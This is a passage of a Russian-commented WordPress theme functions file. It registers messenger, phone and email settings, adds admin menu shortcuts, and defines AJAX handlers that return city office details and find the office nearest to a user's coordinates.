//  unset($side['dashboard_quick_press']);		 //Быстрая публикация  
//  unset($side['dashboard_recent_drafts']);	 //Полседние черновики  
    unset($side['dashboard_primary']); 			 //Блог WordPress  
    unset($side['dashboard_secondary']); 		 //Другие Нновости WordPress  
    unset($normal['dashboard_incoming_links']);  //Входящие ссылки  
//  unset($normal['dashboard_right_now']); 		 //Прямо сейчас  
    unset($normal['dashboard_recent_comments']); //Последние комментарии  
    unset($normal['dashboard_plugins']);		 //Последние Плагины  
}  
add_action('wp_dashboard_setup', 'clear_dash' );  


/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// РЕГИСТРИРУЕМ JSON ФАЙЛ С ГОРОДАМИ
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function enqueue_custom_script() {
    // Регистрируем и подключаем ваш скрипт
    wp_register_script('custom-script', get_template_directory_uri() . '/js/russian-cities.json', array(), '1.0', true);

    // Локализуем скрипт и передаем путь к файлу JSON в JavaScript
    $json_path = get_template_directory_uri() . '/js/russian-cities.json';
    wp_localize_script('custom-script', 'json_data', array('jsonPath' => $json_path));

    // Подключаем скрипт на странице
    wp_enqueue_script('custom-script');
}
add_action('wp_enqueue_scripts', 'enqueue_custom_script');

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// РЕГИСТРИРУЕМ ССЫЛКИ НА СОЦИАЛЬНЫЕ СЕТИ
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

// Добавляем опции в раздел "Настройки" в админке
function theme_custom_settings_init() {
    add_settings_section(
        'theme_social_links_section',
        'Ссылки на мессенджеры',
        'theme_social_links_section_callback',
        'general'
    );

    add_settings_field(
        'theme_telegram_link',
        'Ссылка на Telegram Десктоп',
        'theme_telegram_link_callback',
        'general',
        'theme_social_links_section'
    );

    add_settings_field(
        'theme_whatsapp_link',
        'Ссылка на WhatsApp Десктоп',
        'theme_whatsapp_link_callback',
        'general',
        'theme_social_links_section'
    );

    add_settings_field(
        'theme_viber_link',
        'Ссылка на Viber Десктоп',
        'theme_viber_link_callback',
        'general',
        'theme_social_links_section'
    );

	add_settings_field(
        'theme_vk_link',
        'Ссылка на VK',
        'theme_vk_link_callback',
        'general',
        'theme_social_links_section'
    );

	add_settings_field(
        'theme_telegram_mobile_link',
        'Ссылка на Telegram Мобильная',
        'theme_telegram_mobile_link_callback',
        'general',
        'theme_social_links_section'
    );

    add_settings_field(
        'theme_whatsapp_mobile_link',
        'Ссылка на WhatsApp Мобильная',
        'theme_whatsapp_mobile_link_callback',
        'general',
        'theme_social_links_section'
    );

    add_settings_field(
        'theme_viber_mobile_link',
        'Ссылка на Viber Мобильная',
        'theme_viber_mobile_link_callback',
        'general',
        'theme_social_links_section'
    );

    register_setting('general', 'theme_telegram_link');
    register_setting('general', 'theme_whatsapp_link');
    register_setting('general', 'theme_viber_link');
	register_setting('general', 'theme_vk_link');
	register_setting('general', 'theme_telegram_mobile_link');
    register_setting('general', 'theme_whatsapp_mobile_link');
    register_setting('general', 'theme_viber_mobile_link');
}
add_action('admin_init', 'theme_custom_settings_init');

// Вывод текста описания для раздела "Настройки"
function theme_social_links_section_callback() {
    echo '<p>Введите ссылки на мессенджеры:</p>';
}

// Вывод полей для ввода ссылок
function theme_telegram_link_callback() {
    $value = esc_attr(get_option('theme_telegram_link'));
    echo '<input type="text" id="theme_telegram_link" name="theme_telegram_link" value="' . $value . '" class="regular-text" />';
}

function theme_whatsapp_link_callback() {
    $value = esc_attr(get_option('theme_whatsapp_link'));
    echo '<input type="text" id="theme_whatsapp_link" name="theme_whatsapp_link" value="' . $value . '" class="regular-text" />';
}

function theme_viber_link_callback() {
    $value = esc_attr(get_option('theme_viber_link'));
    echo '<input type="text" id="theme_viber_link" name="theme_viber_link" value="' . $value . '" class="regular-text" />';
}

function theme_vk_link_callback() {
    $value = esc_attr(get_option('theme_vk_link'));
    echo '<input type="text" id="theme_vk_link" name="theme_vk_link" value="' . $value . '" class="regular-text" />';
}

function theme_telegram_mobile_link_callback() {
    $value = esc_attr(get_option('theme_telegram_mobile_link'));
    echo '<input type="text" id="theme_telegram_mobile_link" name="theme_telegram_mobile_link" value="' . $value . '" class="regular-text" />';
}

function theme_whatsapp_mobile_link_callback() {
    $value = esc_attr(get_option('theme_whatsapp_mobile_link'));
    echo '<input type="text" id="theme_whatsapp_mobile_link" name="theme_whatsapp_mobile_link" value="' . $value . '" class="regular-text" />';
}

function theme_viber_mobile_link_callback() {
    $value = esc_attr(get_option('theme_viber_mobile_link'));
    echo '<input type="text" id="theme_viber_mobile_link" name="theme_viber_mobile_link" value="' . $value . '" class="regular-text" />';
}


// Добавляем протокол viber
add_filter( 'kses_allowed_protocols', 'add_viber_to_allowed_protocols' );

function add_viber_to_allowed_protocols( $protocols ) {
	$protocols[] = 'viber';

	return $protocols;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// РЕГИСТРИРУЕМ НАСТРОЙКИ ТЕЛЕФОНА И ПОЧТЫ
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_general_settings_fields() {
    add_settings_section('custom_general_section', 'Настройки телефона и почты по умолчанию', 'custom_general_section_callback', 'general');

    add_settings_field('phone_number', 'Номер телефона', 'phone_number_callback', 'general', 'custom_general_section');
    add_settings_field('phone_link', 'Ссылка на номер телефона', 'phone_link_callback', 'general', 'custom_general_section');
	add_settings_field('email_address', 'Электронная почта', 'email_address_callback', 'general', 'custom_general_section');

    register_setting('general', 'phone_number');
    register_setting('general', 'phone_link');
	register_setting('general', 'email_address');
}

function custom_general_section_callback() {
    echo '<p>Введите настройки для телефона и почты по умолчанию</p>';
}

function phone_number_callback() {
    $phone_number = get_option('phone_number');
    echo "<input type='text' id='phone_number' name='phone_number' value='$phone_number'>";
}

function phone_link_callback() {
    $phone_link = get_option('phone_link');
    echo "<input type='text' id='phone_link' name='phone_link' value='$phone_link'>";
}

function email_address_callback() {
    $email_address = get_option('email_address');
    echo "<input type='email' id='email_address' name='email_address' value='$email_address'>";
}

add_action('admin_init', 'custom_general_settings_fields');

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// ВЫВОДИМ СТРАНИЦЫ В АДМИНКУ
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

// Главная страница
function add_custom_page_to_admin_menu() {
    add_menu_page(
        'Главная', // Название в меню
        'Главная', // Название на панели
        'manage_options', // Уровень доступа
        'post.php?post=170&action=edit', // Идентификатор страницы
        '', // Пустая строка, так как страница уже существует
        'dashicons-admin-home', // Иконка (смотрите список иконок)
        5 // Позиция в меню
    );
}
add_action('admin_menu', 'add_custom_page_to_admin_menu');

// Страница "Услуги"
function add_custom_page_service_to_admin_menu() {
    add_menu_page(
        'Страница "Услуги"', // Название в меню
        'Страница "Услуги"', // Название на панели
        'manage_options', // Уровень доступа
        'post.php?post=178&action=edit', // Идентификатор страницы
        '', // Пустая строка, так как страница уже существует
        'dashicons-editor-table', // Иконка (смотрите список иконок)
        6 // Позиция в меню
    );
}
add_action('admin_menu', 'add_custom_page_service_to_admin_menu');

// Страница "О компании"
function add_custom_page_company_to_admin_menu() {
    add_menu_page(
        'О компании', // Название в меню
        'О компании', // Название на панели
        'manage_options', // Уровень доступа
        'post.php?post=172&action=edit', // Идентификатор страницы
        '', // Пустая строка, так как страница уже существует
        'dashicons-welcome-learn-more', // Иконка (смотрите список иконок)
        6 // Позиция в меню
    );
}
add_action('admin_menu', 'add_custom_page_company_to_admin_menu');

// Страница "Команда"
function add_team_page_to_admin_menu() {
    $parent_slug = 'post.php?post=6&action=edit'; // Идентификатор родительской страницы "Команда"

    add_menu_page(
        'Команда', // Название в меню
        'Команда', // Название на панели
        'manage_options', // Уровень доступа
        $parent_slug, // Уникальный идентификатор страницы "Команда"
        '', // Пустая строка, так как страница уже существует
        'dashicons-groups', // Иконка (смотрите список иконок)
        5 // Позиция в меню
    );

    // Получаем дочерние страницы "Команда"
    $args = array(
        'post_parent' => 6, // ID родительской страницы "Команда"
        'post_type'   => 'page',
    );

    $child_pages = get_children($args);

    if ($child_pages) {
        foreach ($child_pages as $child_page) {
            add_submenu_page(
                $parent_slug, // Идентификатор родительской страницы "Команда"
                $child_page->post_title, // Название в меню (берем из заголовка страницы)
                $child_page->post_title, // Название на панели (берем из заголовка страницы)
                'manage_options', // Уровень доступа
                'post.php?post=' . $child_page->ID . '&action=edit' // Уникальный идентификатор дочерней страницы
            );
        }
    }
}

add_action('admin_menu', 'add_team_page_to_admin_menu');


/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// //ОБРАБОТЧКИ AJAX-ЗАПРОСА В PHP
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

// Запрос на получение данных города
function my_ajax_handler() {
    $cityName = $_POST['city'];

    $args = array(
        'post_type' => 'city',
        'posts_per_page' => 1,
        'title' => $cityName
    );

    $query = new WP_Query($args);

    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            $city_title = get_the_title();
            $phone_number = get_field('номер_телефона');
			$phone_number_link = get_field('номер_телефона_ссылка');
			$email = get_field('почта');

			$yandex_rating = get_field('яндекс');
            $yandex_amount = get_field('количество_отзывов_яндекс');
			$yandex_link = get_field('яндекс_ссылка');

			$google_rating = get_field('google');
            $google_amount = get_field('количество_отзывов_google');
			$google_link = get_field('google_ссылка');

			$twogis_rating = get_field('2гис');
            $twogis_amount = get_field('количество_отзывов_2гис');
			$twogis_link = get_field('2гис_ссылка');

			$coordinate_longitude = get_field('координата_долгота');
            $coordinate_latitude = get_field('координата_широта');
			$full_address = get_field('полный_адрес');

            $response = array(
                'title' => $city_title,
                'phone' => $phone_number,
				'phone_link' => $phone_number_link,
				'email' => $email,

				'yandex_rating' => $yandex_rating,
                'yandex_amount' => $yandex_amount,
				'yandex_link' => $yandex_link,

                'google_rating' => $google_rating,
				'google_amount' => $google_amount,
                'google_link' => $google_link,

				'twogis_rating' => $twogis_rating,
                'twogis_amount' => $twogis_amount,
				'twogis_link' => $twogis_link,

				'coordinate_longitude' => $coordinate_longitude,
                'coordinate_latitude' => $coordinate_latitude,
				'full_address' => $full_address
            );
        }
        wp_reset_postdata();
        echo json_encode($response); // Отправка данных обратно в JSON-формате
    } else {
        echo json_encode(array('error' => 'Запись не найдена'));
    }

    die(); // Важно завершить выполнение обработчика
}
add_action('wp_ajax_my_ajax_action', 'my_ajax_handler'); // Для авторизованных пользователей
add_action('wp_ajax_nopriv_my_ajax_action', 'my_ajax_handler'); // Для неавторизованных пользователей

// Запрос на получение ближайшего города с офисом
function my_ajax_handler_map() {
    // Получение координат из AJAX-запроса
    $userLat = floatval($_POST['latitude']);
    $userLon = floatval($_POST['longitude']);

    // Выполните логику по поиску ближайшего города и его координат
    $args = array(
        'post_type' => 'city',
        'posts_per_page' => -1,
    );

    $cities = get_posts($args);

    $nearestCity = null;
    $minDistance = PHP_INT_MAX;

    foreach ($cities as $city) {
        $cityName = get_the_title($city->ID);
        $cityFullAddress = get_field('полный_адрес', $city->ID);
        $cityLat = floatval(get_field('координата_широта', $city->ID));
        $cityLon = floatval(get_field('координата_долгота', $city->ID));

        $distance = calculateDistance($userLat, $userLon, $cityLat, $cityLon);

        if ($distance < $minDistance) {
            $minDistance = $distance;
            $nearestCity = array(
                'closest_city' => $cityName,
                'city_full_address' => $cityFullAddress,
                'closest_latitude' => $cityLat,
                'closest_longitude' => $cityLon
            );
        }
    }

    echo json_encode($nearestCity);
    wp_die(); // Важно завершить выполнение обработчика
}
function calculateDistance($lat1, $lon1, $lat2, $lon2) {
    $earthRadius = 6371; // Радиус Земли в километрах
    $dLat = deg2rad($lat2 - $lat1);
    $dLon = deg2rad($lon2 - $lon1);
    $a = sin($dLat / 2) * sin($dLat / 2) + cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * sin($dLon / 2) * sin($dLon / 2);
    $c = 2 * atan2(sqrt($a), sqrt(1 - $a));
    $distance = $earthRadius * $c;
    return $distance;
}
add_action('wp_ajax_my_ajax_action_map', 'my_ajax_handler_map'); // Для авторизованных пользователей
add_action('wp_ajax_nopriv_my_ajax_action_map', 'my_ajax_handler_map'); // Для неавторизованных пользователей


function my_enqueue_scripts() {
    // Регистрируем скрипт и добавляем к нему переменную ajaxurl
    wp_enqueue_script('my-custom-script', get_template_directory_uri() . '/js/header.js', array('jquery'), null, true);
    wp_localize_script('my-custom-script', 'myAjax', array('ajaxurl' => admin_url('admin-ajax.php')));
}
add_action('wp_enqueue_scripts', 'my_enqueue_scripts');
?>
